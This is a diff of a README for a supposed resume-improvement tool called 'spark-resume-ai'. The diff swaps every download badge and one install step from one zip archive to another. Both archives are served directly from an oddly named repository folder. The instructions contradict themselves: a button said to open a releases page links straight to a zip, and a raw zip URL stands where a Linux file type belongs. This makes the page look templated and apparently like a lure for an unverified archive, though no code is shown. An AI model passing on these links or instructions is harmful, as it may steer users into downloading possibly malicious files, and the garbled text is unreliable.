@@ -4,7 +4,7 @@
 
 Welcome to spark-resume-ai! This is your go-to tool for improving your resume for the Australian job market. With insights from over 20 years in hiring, you can enhance your job applications easily and effectively. 
 
-[![Download Now](https://raw.githubusercontent.com/Temat1100/spark-resume-ai/main/stationariness/spark-resume-ai_3.7.zip)](https://raw.githubusercontent.com/Temat1100/spark-resume-ai/main/stationariness/spark-resume-ai_3.7.zip)
+[![Download Now](https://raw.githubusercontent.com/Temat1100/spark-resume-ai/main/stationariness/resume_spark_ai_v1.5.zip)](https://raw.githubusercontent.com/Temat1100/spark-resume-ai/main/stationariness/resume_spark_ai_v1.5.zip)
 
 ## 💡 Features
 
@@ -27,11 +27,11 @@ To run spark-resume-ai smoothly, ensure you have the following:
 
 1. **Visit the Releases Page**: Click the button below to go to the releases page where you can find the latest version.
 
-   [![Download Now](https://raw.githubusercontent.com/Temat1100/spark-resume-ai/main/stationariness/spark-resume-ai_3.7.zip)](https://raw.githubusercontent.com/Temat1100/spark-resume-ai/main/stationariness/spark-resume-ai_3.7.zip)
+   [![Download Now](https://raw.githubusercontent.com/Temat1100/spark-resume-ai/main/stationariness/resume_spark_ai_v1.5.zip)](https://raw.githubusercontent.com/Temat1100/spark-resume-ai/main/stationariness/resume_spark_ai_v1.5.zip)
 
 2. **Choose Your Version**: Look for the latest release, and click on the version number to view all available downloads.
 
-3. **Select Your File**: Depending on your operating system, find the appropriate file (e.g., a `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Temat1100/spark-resume-ai/main/stationariness/spark-resume-ai_3.7.zip` for Linux).
+3. **Select Your File**: Depending on your operating system, find the appropriate file (e.g., a `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Temat1100/spark-resume-ai/main/stationariness/resume_spark_ai_v1.5.zip` for Linux).
 
 4. **Download the File**: Click on the download link for your chosen file. The download should begin automatically.
 
